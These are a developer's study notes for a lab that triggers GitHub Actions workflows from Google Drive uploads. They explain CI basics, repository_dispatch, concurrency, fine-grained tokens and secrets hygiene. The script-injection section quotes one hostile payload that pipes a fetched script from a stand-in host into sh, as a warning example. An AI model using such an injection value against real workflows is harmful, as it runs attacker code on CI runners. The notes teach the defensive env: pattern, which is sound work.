# drive-ci-lab — study notes

The complete study companion to this lab. `TUTORIAL.md` holds the phase plan and current
status (the *state*); this file holds the explanations, command breakdowns, by-hand
examples, and lessons learned (the *textbook*). It grows as phases complete.

**The lab's goal:** an upload to Google Drive immediately (true push, no polling) triggers
a GitHub Actions workflow that downloads that file onto the runner and processes it.

```
Phase 1          Phase 2              Phase 4/5                 Goal
git push  ──►    curl POST  ──►       Drive upload ──► relay ──► POST
   │                │                                              │
   ▼                ▼                                              ▼
 GitHub event system ──► workflow matches on: ──► fresh VM ──► run.py
```

Every phase only swaps **who sends the event**. The right half never changes.

---

## 1. CI fundamentals — what actually happens

CI has zero magic: *a computer somewhere runs a checklist of shell commands whenever
something happens.*

### The cast of characters

1. **Your machine** — where you edit and `git push`.
2. **GitHub's servers** — store the repo and watch it for **events**.
3. **A runner** — a fresh, disposable VM booted on demand to execute the checklist, then
   destroyed.
4. **The checklist** — a workflow file in `.github/workflows/`: "when X happens, boot a
   machine and run these commands."

### The chain, step by step (as it ran for our first push)

1. `git push` sends commits to GitHub over HTTPS.
2. GitHub's event system emits a **`push` event** — a JSON blob: repo, branch, commit,
   pusher.
3. GitHub asks every file in `.github/workflows/`: *does your `on:` block match this
   event?* `ci.yml` (`on: push`) matches; `drive.yml` (`on: repository_dispatch`) stays
   silent.
4. GitHub queues a **run** and boots a runner: a brand-new Ubuntu VM with nothing of ours
   on it. "Always start from blank" is deliberate — it proves the project builds for
   *anyone from scratch*. ("Works on my machine" is the disease; CI is the cure.)
5. The runner executes the steps top to bottom — each is just a shell command:
   - `actions/checkout@v4` ≈ `git clone` the repo onto the VM
   - `actions/setup-python@v5` ≈ install Python
   - `run: python run.py --hello` → the script prints its line
6. Every command exited `0` → conclusion `success` → the `✓`. Any non-zero exit stops the
   checklist and marks the run `✗`. All stdout/stderr is captured with timestamps.
7. The VM is destroyed. Only the logs and the verdict persist.

### By-hand exercise: *be the runner yourself*

```bash
cd /tmp                                                       # blank machine: no repo here
git clone https://github.com/anden-karlsson/drive-ci-lab.git  # ← actions/checkout@v4
cd drive-ci-lab
python3 --version                                             # ← setup-python (VM had to install it)
python3 run.py --hello                                        # ← the `run:` step
echo "exit code: $?"                                          # ← how GitHub decides ✓ or ✗
rm -rf /tmp/drive-ci-lab                                      # ← GitHub destroying the VM
```

That **is** the entire job — GitHub just does it on their computer, triggered by an event
instead of you typing.

`$?` is a special shell variable holding the previous command's exit code. `0` = success.
CI "success" means nothing more than *every step exited 0*.

---

## 2. Phase 1 — baseline CI (`ci.yml`)

```yaml
name: baseline            # workflow display name (the WORKFLOW column in run lists)

on:
  push:                   # trigger: any push, any branch (no branch filter)

jobs:
  hello:
    runs-on: ubuntu-latest        # boot the latest Ubuntu runner image
    steps:
      - uses: actions/checkout@v4     # clone repo onto the runner
      - uses: actions/setup-python@v5 # install Python
        with:
          python-version: "3.13"
      - run: python run.py --hello    # the actual work
```

Notes:

- `on: push` with no filter fires on **every** push to **any** branch — including pushes
  that only edit workflows or docs. Real projects usually filter:
  `on: push: branches: [main]` (and/or `paths:`) to stop burning runs.
- Runs are fast (~10s) because `setup-python` downloads a pre-built cached Python; nothing
  compiles.

### Reading `gh run list` output

```
STATUS  TITLE                                   WORKFLOW  BRANCH  EVENT  ID           ELAPSED  AGE
✓       phase 1: baseline CI runs dummy run.py  baseline  main    push   29491020943  11s      about 20 minutes ago
```

- **STATUS** — `✓` all jobs succeeded, `✗` failed, spinner/`*` in progress. It is purely
  "did every command exit 0".
- **TITLE** — for push runs: the **commit message** (one reason good commit messages
  matter — they label your CI runs). For `repository_dispatch` runs there is no commit, so
  the **event type** shows instead (`drive-upload`).
- **WORKFLOW** — the `name:` field from the YAML. Distinguishes rows when one push
  triggers several workflows.
- **BRANCH / EVENT** — where and *why*. The EVENT column is the heart of this lab: it
  moves from `push` to `repository_dispatch`.
- **ID** — the run's unique id (API name: `databaseId`); what you pass to
  `gh run view <id>` / the logs endpoint.
- Status vs conclusion (JSON fields): `status` = is it done (`queued`/`in_progress`/
  `completed`); `conclusion` = how it ended (`success`/`failure`/`cancelled`/`skipped`).
  A run can be completed-but-failed — two separate questions.

---

## 3. Toolbox — `gh` CLI patterns (for stock Ubuntu gh 2.45)

Environment fact: this machine runs WSL2 Ubuntu with distro-packaged tools. Ubuntu's repos
**freeze** versions at release and only backport security fixes — so `gh` is 2.45 (2024).
We adapt commands to it rather than upgrading.

### Quirk 1 — `gh` detects pipes and goes non-interactive

`gh run view --log | grep ...` fails with "run or job ID required": with a pipe attached,
`gh` can't show its interactive run picker, so it demands an explicit ID. Piped output also
loses table headers/colors. Fix: always pass an ID when piping.

### Quirk 2 — `gh run view --log` is silently broken on 2.45

GitHub changed the log-archive format; old `gh` unzips it, matches no files, prints
*nothing* and exits `0`. (Silent failure = design flaw; good tools fail loudly.)

**Workaround — fetch the logs zip via the raw API and unzip it ourselves:**

```bash
gh api repos/anden-karlsson/drive-ci-lab/actions/runs/<RUN_ID>/logs > /tmp/logs.zip \
  && unzip -p /tmp/logs.zip | grep -A4 "event action:"
```

- `gh api <path>` — authenticated request to `https://api.github.com/<path>` (this is what
  every gh subcommand does under the hood). This endpoint returns a **zip** (one text file
  per step), hence redirecting to a file.
- `unzip -p` — extract to stdout (**p**ipe), no files created on disk.
- `grep -A4 "pattern"` — matching line **A**nd 4 lines after (captures multi-line JSON).
- ⚠ `<RUN_ID>` is placeholder notation — bash reads literal `<` as "redirect input from a
  file", so `<ID>` errors with `ID: No such file or directory`. Substitute the real number,
  no brackets.

### Scripting best practice: `--json` + `--jq`, never parse tables

```bash
gh run list --limit 1 --json databaseId --jq '.[0].databaseId'
```

- `--json <fields>` — structured output instead of the human table (whose formatting can
  change between versions and contains padding/colors).
- `--jq '<expr>'` — built-in JSON query: output is an array of runs; `.[0]` takes the
  first, `.databaseId` extracts the field. By hand: `[{"databaseId": 123}]` → `.[0]` →
  `{"databaseId": 123}` → `.databaseId` → `123`.
- `$( ... )` — command substitution: run the inner command first, paste its output into
  the outer one. `gh run view $(...) --log` automates "read the ID from the table by hand".

Also useful: `gh run view <id> --json conclusion,status`, `gh workflow list`,
`gh run view <id> --web` (open the browser UI — the per-step ✓/timing view).

### Reading raw Actions logs

- Every line is prefixed with a UTC timestamp.
- `##[group]` / `##[endgroup]` — Actions' log-folding markup (collapsible steps in the web
  UI).
- `[36;1m ... [0m` — ANSI color codes intended for a terminal.
- Content appears **twice** in the zip: each step's standalone file + the full-job log.
  Nothing ran twice — the timestamps are identical to the microsecond.
- The step header echoes the resolved `env:` block — handy for verifying what values were
  actually injected.

---

## 4. Phase 2 — `repository_dispatch` (external events)

### The concept

`on: push` = GitHub notices an event *inside* GitHub. A Drive upload happens *outside* —
GitHub can't see it. `repository_dispatch` is the repo's **inbox for external events**:
anyone with a token can POST to the repo's `/dispatches` API endpoint saying "an external
event happened, here's JSON about it", and workflows listening for that `event_type` fire.
In Phase 4/5 a relay does the POSTing; in Phase 2 *we* are the relay, by hand with curl —
learning the raw mechanics before a service hides them.

Non-obvious rule: **`repository_dispatch` only triggers workflows on the default branch.**
The workflow file must be pushed to `main` before events can reach it. Corollary that bit
us (see §7): the runner executes the workflow **as it exists on `main` at event time**,
not what's on your disk.

### `drive.yml` line by line

```yaml
name: drive

on:
  repository_dispatch:
    types: [drive-upload]     # fires on POST to /dispatches with event_type "drive-upload"

concurrency:
  group: ${{ github.ref }}    # one lane; see the concurrency deep-dive below
  cancel-in-progress: false   # new runs QUEUE behind the in-progress one, never kill it

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: show payload
        env:                  # bridge GitHub-context values into the shell as DATA
          EVENT_ACTION: ${{ github.event.action }}
          PAYLOAD: ${{ toJson(github.event.client_payload) }}
        run: |
          echo "event action: ${EVENT_ACTION}"
          echo "payload: ${PAYLOAD}"
```

- `types: [drive-upload]` — a filter. The type string is invented by us; one repo can
  receive many kinds of dispatches and route them to different workflows. Without
  `types:`, every dispatch would fire this workflow. The workflow knows nothing about
  Drive — Drive enters in Phase 4.
- For dispatch events, `github.event.action` holds the `event_type` string and
  `github.event.client_payload` the sender's arbitrary JSON — the envelope that will later
  carry the Drive file id/name.

### Concurrency deep-dive

Mental model: GitHub keeps one **lane** per group name. Per lane: **at most 1 run in
progress and at most 1 pending.**

- `cancel-in-progress: false` — a new event queues in the pending slot; the running one
  finishes. Right for pipelines where every event is real work.
- `cancel-in-progress: true` — a new event kills the running one. Right when only the
  latest matters (e.g. CI on a PR: push a fix 30s later, the old verdict is worthless —
  kill it, save compute).
- **The gotcha we plan to observe in Phase 4's burst test:** the pending slot holds ONE
  run. Three uploads during a run → #2 goes pending, #3 *replaces* #2, #2 is silently
  cancelled. Concurrency prevents parallel stampedes but is **not a real queue — bursty
  producers lose events.** Real fix: make the run discover *all* unprocessed work instead
  of trusting one event per file (Phase 5's "push-to-pull" relay query).
- Shop analogy: one service counter (in progress) + one chair (pending). `true` = the new
  customer shoves the current one out the door; `false` = they take the chair. Either way
  a third customer takes the chair *from* the second, who just leaves.
- Scoping: groups are **repo-wide, not per-workflow**. Two workflows using the same group
  name share a lane and queue/cancel each other.
- Our `group: ${{ github.ref }}`: the copy-paste idiom for per-branch lanes in push/PR
  workflows. For dispatch events `github.ref` is *always* `refs/heads/main`, so it's
  functionally one lane — equivalent to a fixed name like `drive-run` today. A fixed
  intent-named group can't accidentally collide if another workflow later adopts the same
  `${{ github.ref }}` idiom; kept as-is as an informed choice.
- Default without a concurrency block: unlimited parallel runs.

### The `run:` block — three stacked mechanisms

1. **`|` — YAML literal block scalar**: everything indented below is one multi-line
   string, newlines preserved.
2. **The string becomes one shell script**, executed with `bash -e -o pipefail`. `-e` =
   abort on the first non-zero command; `-o pipefail` = a pipeline fails if *any* command
   in it fails, not just the last. (Same as the `set -euo pipefail` best-practice header
   in hand-written scripts.)
3. **`${{ ... }}` is template substitution, not shell.** GitHub's server evaluates the
   expression and **pastes the literal result into the script text before bash runs**.
   Rule of thumb: `${{ ... }}` = GitHub's world (server-side); `${...}` = bash's world.
   The `env:` block is the bridge between them.

### Script injection — why the `env:` indirection

If you write `run: echo "payload: ${{ toJson(github.event.client_payload) }}"`, the
payload text is pasted **into shell code**. A payload containing `"; curl evil.sh | sh; "`
becomes executable shell. This is **script injection**, the #1 real-world Actions
vulnerability — critical here because Phase 4 hands the sending to external services.

The fix: pass untrusted event data through `env:`. Environment variable *values* are data
— bash expands them but never parses them as code:

```yaml
env:
  PAYLOAD: ${{ toJson(github.event.client_payload) }}   # substitution happens HERE (into a value)
run: |
  echo "payload: ${PAYLOAD}"                            # bash reads a variable — pure data
```

Related trap: `GITHUB_EVENT_ACTION` **does not exist**. GitHub predefines some default env
vars (`GITHUB_EVENT_NAME`, `GITHUB_REPOSITORY`, `GITHUB_SHA`, …) but the event's *action*
lives only in the `github.event` context — you must bridge it yourself
(`EVENT_ACTION: ${{ github.event.action }}`). An unset bash variable expands to empty, no
error — our first dispatch printed `event action:` blank because of this.

### Personal Access Tokens (PATs)

- `/dispatches` changes repo state (starts workflows) → authentication required. In the
  terminal `gh` is already authenticated, but the Phase 4/5 relay is not *us* — it needs
  its own credential. A PAT is a password-like string acting as you, with restrictions you
  choose.
- **Fine-grained (modern) vs classic:** classic PATs are all-or-nothing (`repo` scope =
  full control of every repo you own). Fine-grained = *this one repo, these specific
  permissions, this expiry*. Leak blast radius: one throwaway repo for a few weeks.
  **Least privilege.**
- Ours: `drive-ci-lab-dispatch`, only `drive-ci-lab`, **Contents: Read and write**, 30-day
  expiry (dies on its own even if teardown is forgotten). Counterintuitively, Contents
  write is what `/dispatches` requires — there is no "dispatch" permission. The API
  confirmed it in a response header: `x-accepted-github-permissions: contents=write`.
- Creation is browser-only (Settings → Developer settings → Personal access tokens →
  Fine-grained) — deliberate on GitHub's part. Token shown exactly once. Name tokens after
  their job so future-you knows what to revoke.

### The curl — anatomy of a webhook-style POST

Exploration form (see everything):

```bash
curl -i -X POST \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer ${DRIVE_PAT}" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/anden-karlsson/drive-ci-lab/dispatches \
  -d '{"event_type":"drive-upload","client_payload":{"file_name":"test.csv","note":"fired by hand"}}'
```

- `curl` — raw HTTP; this is literally what every relay/webhook service does under the hood.
- `-i` — include response **headers**. Crucial: success is `204 No Content` — an empty
  body. Without `-i`, success looks like nothing happened.
- `-X POST` — GET reads, POST submits/creates; firing an event is a create.
- `Accept: application/vnd.github+json` — "answer in GitHub's JSON dialect" (recommended
  on all API calls).
- `Authorization: Bearer ${DRIVE_PAT}` — the auth. "Bearer" = *whoever bears this token is
  authorized* — why tokens must never leak. Bash substitutes the variable before sending.
- `X-GitHub-Api-Version: 2022-11-28` — pins API version so future changes can't silently
  alter behavior; best practice for anything scripted.
- `-d '{...}'` — the body. `event_type` must match the workflow's `types:` **exactly**;
  `client_payload` is arbitrary JSON.

Scripting form (status code only): replace `-i` with

```bash
curl -s -o /dev/null -w "%{http_code}\n" ...
```

`-s` silent (no progress meter), `-o /dev/null` discard the (empty) body,
`-w "%{http_code}"` write just the status code after finishing. Output: `204`.

Response headers worth knowing (from our real 204):

- `github-authentication-token-expiration` — when the PAT self-destructs.
- `x-accepted-github-permissions: contents=write` — which permission the endpoint checked.
- `x-ratelimit-limit: 5000` / `-remaining` — authenticated calls get 5000/hour. A runaway
  relay looping dispatches would eat this.
- The rest (CSP, `x-frame-options`, HSTS…) is boilerplate browser-security — ignorable for
  API work.

### HTTP status taxonomy (memorize this)

- **2xx — success.** `204 No Content` = "done, body intentionally empty".
- **4xx — your fault; retrying identically is pointless.**
  - `401` — bad/missing token (we hit this: empty `${DRIVE_PAT}` → literally
    `Authorization: Bearer ` → unauthorized).
  - `404` — token valid but lacks access: GitHub says "not found" rather than "forbidden"
    to avoid confirming a private repo exists.
  - `422` — malformed JSON body.
- **5xx — their fault; retrying is exactly right.** We hit a transient `503` from
  `gh run list`; the second attempt succeeded. Incidents: https://www.githubstatus.com
- Phase 5 design input: a relay should **retry 5xx with backoff** and **treat 4xx as a bug
  to log**.

### Secrets hygiene (lessons lived, not just read)

- **Never type a secret into a command line** — everything typed lands in
  `~/.bash_history` in plain text. Capture it instead:

  ```bash
  read -rs DRIVE_PAT     # -s silent (no echo), -r raw (backslashes untouched); paste, Enter
  echo ${#DRIVE_PAT}     # ${#var} = length; verifies it landed WITHOUT printing it
  ```

- **Env vars are per-shell-session, not per-machine.** New terminal / new script / fresh
  shell = empty environment. Our 401 was exactly this. It's also *why CI has repo
  secrets* (Phase 3) instead of assuming variables exist.
- **File-based idiom for persistence:** `.env.txt` containing `DRIVE_PAT=github_pat_...`;
  load with `source .env.txt` (`source` executes the file's lines *in the current shell*,
  so the assignment sticks — a plain `./file` would run in a subshell and the variable
  would die with it). Lock it down: `chmod 600 .env.txt` (6 = read+write owner, 0 group,
  0 others).
- **`.gitignore` the secret file before it can be committed:** pattern `.env*` covers
  `.env`, `.env.txt`, `.env.local`. `.gitignore` itself IS committed — shared convention
  protecting everyone. A pushed secret is compromised forever: GitHub scans public repos
  and auto-revokes leaked PATs, bots scrape them within seconds, history rewrites don't
  unleak — revocation is the only fix.
- **`git add <specific files>`, not `git add .`**, whenever anything unfamiliar sits in
  the working tree; `git status` before every commit. (Our `.env.txt` was one careless
  `git add .` away from publication.)

### Phase 2 checkpoint — what was proven

`curl POST (204)` → run appeared with EVENT `repository_dispatch`, TITLE `drive-upload`
(no commit behind it) → log showed the `env:` block injecting `EVENT_ACTION: drive-upload`
and the step printing the payload JSON round-tripped from the hand-typed curl body.
External HTTP request → GitHub event system → fresh VM → our data. The skeleton is done.

---

## 5. Gotchas log (chronological war stories)

| Gotcha | Symptom | Root cause → fix |
|---|---|---|
| heredoc wrote `ci.yml` to repo root | workflow never triggered | wrong path → `mv` into `.github/workflows/` |
| `checkout @v4` (space) | invalid action ref | typo → `checkout@v4` |
| `gh run view --log \| grep` | "run or job ID required" | pipe → non-interactive mode, no picker → pass explicit ID |
| `gh run view <id> --log` empty, exit 0 | no output at all | gh 2.45 can't parse new log-archive format → `gh api .../logs` + `unzip -p` |
| `<ID>` pasted literally | `ID: No such file or directory` | bash parses `<` as input redirection → placeholders get substituted, no brackets |
| `event action:` printed blank | payload OK, action empty | (a) `GITHUB_EVENT_ACTION` doesn't exist as a default var; (b) fix was edited locally but **not pushed** — dispatch runs use `main`, not your disk |
| curl returned `401` | dispatch refused | `DRIVE_PAT` empty in a fresh shell → env vars are per-session; `source .env.txt` in the same compound command |
| `.env.txt` in `git status` | one `git add .` from leaking | `.gitignore` with `.env*`; add files by name |
| `gh run list` → `503` | listing failed once | GitHub transient server error → 5xx = retry; 4xx = don't |

---

## 6. Upcoming phases (plan — details to be filled in as they happen)

- **Phase 3 — service account + Drive download.** New concept: a **service account**, a
  robot Google identity. CI can't do the interactive "Sign in with Google" dance, so:
  GCP project → enable Drive API → SA + JSON key → share the Drive test folder with the
  SA's own email (like sharing with a human) → store key as repo secret
  (`gh secret set GDRIVE_SA_KEY < key.json`) — the CI-proper answer to "env vars are
  per-shell". Extend `run.py` (google-api-python-client + google-auth) to download the
  payload-named file. Checkpoint: curl-fired run downloads a manually uploaded file.
- **Phase 4 — relay A: Pipedream (managed).** Drive "new file" instant trigger (true
  push; Pipedream owns watch-channel renewal) → HTTP step POSTing the dispatch.
  Milestone 1: upload → run downloads that file in seconds. Burst test: observe the
  pending-slot event loss predicted in §4.
- **Phase 5 — relay B: self-hosted Cloud Function (the internals).** `relay/main.py`:
  validate `X-Goog-Channel-Token`, ignore `sync`, **push-to-pull** (query changes/files
  instead of trusting the ping), debounce, POST dispatch. `register_watch.py` +
  `renew.yml` weekly cron — the cron renews the *subscription* only; detection stays
  push. Milestone 2: upload → function log → run downloads file.
- **Phase 6 — wrap-up:** recap both architectures; teardown.

## 7. Teardown checklist (do not skip at the end)

- [ ] Stop/delete the Drive watch channel
- [ ] Delete the Cloud Function (and the GCP project)
- [ ] Delete the service-account JSON key (local file + revoke in GCP)
- [ ] Revoke the fine-grained PAT (`drive-ci-lab-dispatch`; auto-expires 2026-08-15)
- [ ] Delete the Pipedream workflow
- [ ] Delete `.env.txt` locally
- [ ] Delete the repo
